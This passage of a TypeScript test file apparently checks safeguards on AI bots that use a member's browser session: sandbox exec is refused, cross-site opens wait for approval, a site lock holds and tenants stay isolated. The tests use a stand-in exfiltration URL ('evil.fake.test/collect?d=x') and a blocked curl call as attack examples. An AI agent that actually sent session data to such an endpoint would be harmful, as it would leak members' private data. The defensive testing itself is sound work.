    expect(v.view.browser).toMatchObject({ action: "open", host: "evil.fake.test", sessionSite: HOST });
    expect(fakeCalls("exec")).toBe(execBefore);
    expect(fakeCalls("contextNavigate")).toBe(navBefore);
    const home = await ok(browser("open", ev, scout.id, { url: `https://${HOST}/reports` }));
    expect(home).toMatchObject({ host: HOST, signedIn: true });
    await ok(browser("close", ev, scout.id));
  });

  it("6. team bot Ops with Sam's session loaded: exec is 403 member_data whatever the egress (P-11 first); a cross-site open still asks Sam", async () => {
    const { ev, contextId } = await signedInTurn(ops);
    const execBefore = fakeCalls("exec");
    for (const mode of ["allowlist", "off", "public"] as const) {
      await setEgress(mode);
      const r = await sandbox("exec", ev, ops.id, { argv: ["curl", "https://api.fake.test"] });
      expect(r.status, mode).toBe(403);
      expect(codeOf(r), mode).toBe("member_data");
    }
    await setEgress("allowlist");
    expect(fakeCalls("exec")).toBe(execBefore);
    const asked = await s.su.query(
      "select count(*)::int as n from app.tool_call_approvals where event_id = $1 and tool = 'ocw_sandbox_exec'",
      [ev.eventId],
    );
    expect(asked.rows[0].n).toBe(0);

    const r = await browser("open", ev, ops.id, { url: "https://evil.fake.test/collect?d=x" });
    expect(codeOf(r)).toBe("approval_required");
    expect(fakeContext(contextId)?.host).toBe(HOST);
    const v = await view(s.sam, r.body?.error.details.approval.id as string);
    expect(v.view.browser).toMatchObject({ action: "open", host: "evil.fake.test", sessionSite: HOST });
    expect(v.view.approverLabel).toBe("Waiting for Sam Lee to approve");
  });
});

// ---------------------------------------------------------------- 07.8-28: sticky member data (WINDOWS #292, ADR-0029)

describe("member data is sticky per (bot, conversation) once a member session was loaded there (#292)", () => {
  it("Sam revokes Scout's session: Scout's DM stays sticky; its next page opens signed out but locked to its host, and the Export link to evil.fake.test asks Sam", async () => {
    const [session] = (
      await s.su.query("select id from app.browser_sessions where agent_id = $1 and user_id = $2", [
        scout.id,
        s.samId,
      ])
    ).rows as Json[];
    await ok(s.sam.request("DELETE", `/api/v1/browser-sessions/${session?.id}`) as Promise<Res>, 204);
    const ev = await s.turnOf(s.sam, scout.dm, scout.id);
    expect((await turnRow(ev.eventId)).member_data).toBe(true);
    const opened = await ok(browser("open", ev, scout.id, { url: `https://${HOST}/reports` }));
    expect(opened).toMatchObject({ host: HOST, signedIn: false });
    const contextId = opened.contextId as string;
    expect(fakeContext(contextId)).toMatchObject({ siteLock: HOST, loadedState: false });

    const click = await browser("act", ev, scout.id, { action: "click", ref: "export-link" });
    expect(click.status).toBe(409);
    expect(codeOf(click)).toBe("approval_required");
    const v = await view(s.sam, click.body?.error.details.approval.id as string);
    expect(v.view.title).toBe("Open evil.fake.test");
    // The lock stopped the link: the page stayed on the site.
    expect(fakeContext(contextId)?.host).toBe(HOST);
    await ok(browser("close", ev, scout.id));
  });

  it("the turn row and the pair are written in the turn's own organization: organization B's tenant neither sees nor writes organization A's pair", async () => {
    const core = s.stack.built.core;
    const pair = { agentId: scout.id, conversationId: scout.dm };
    const inA = await core.db.withTenant({ organizationId: s.orgA, userId: s.samId }, (tx) =>
      stickyMemberData(tx, pair),
    );
    expect(inA?.sites).toEqual([HOST]);
    const inB = await core.db.withTenant({ organizationId: s.orgB, userId: s.eveId }, (tx) =>
      stickyMemberData(tx, pair),
    );
    expect(inB).toBeNull();
    // Org A's bot and conversation do not exist in org B (composite FKs): nothing is written there.
    await expect(
      core.db.withTenant({ organizationId: s.orgB, userId: s.eveId }, (tx) =>
        recordMemberData(tx, { ...pair, eventId: randomUUID(), site: "evil.fake.test" }),
      ),
    ).rejects.toThrow();
    const rows = (
      await s.su.query("select organization_id, sites from app.agent_member_data where agent_id = $1", [
        scout.id,
      ])
    ).rows as Json[];
    expect(rows).toEqual([{ organization_id: s.orgA, sites: [HOST] }]);
  });

  it("the pair goes with the bot's history: deleting the conversation removes it (cascade)", async () => {
    const before = await s.su.query(
      "select count(*)::int as n from app.agent_member_data where conversation_id = $1",
      [ops.dm],
    );
    expect(before.rows[0].n).toBe(1);
    await s.su.query("delete from app.conversations where id = $1", [ops.dm]);
    const after = await s.su.query(
      "select count(*)::int as n from app.agent_member_data where conversation_id = $1",
      [ops.dm],
    );
    expect(after.rows[0].n).toBe(0);
  });
});
